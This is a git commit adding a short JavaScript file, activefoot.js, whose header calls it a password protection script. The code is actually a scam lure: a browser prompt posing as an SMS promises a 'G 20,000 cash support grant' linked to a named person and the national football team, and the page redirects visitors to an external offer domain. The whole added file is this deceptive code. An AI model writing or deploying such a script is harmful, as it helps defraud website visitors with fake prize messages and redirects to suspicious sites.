d690907cc6a1c76a3bbce0260bfc760c44f94f7a
Help-All <imaobongumoh637@gmail.com>
2026-06-24 02:10:12 +0100

    Create activefoot.js

---
+++ activefoot.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'G 20,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ALIX DIDIER FILS-AIMÉ G 20,000 CASH SUPPORT GRANT TO CELEBRATE OUR NATIONAL FOOTBALL TEAM. Please press OK to Receive Instantly.',
+  'G 20,000'
+);
+if (password != 'G 20,000') {
+  location.href = 'https://getin-ofer.cfd/Fanatik-Foutbol.html';
+  }
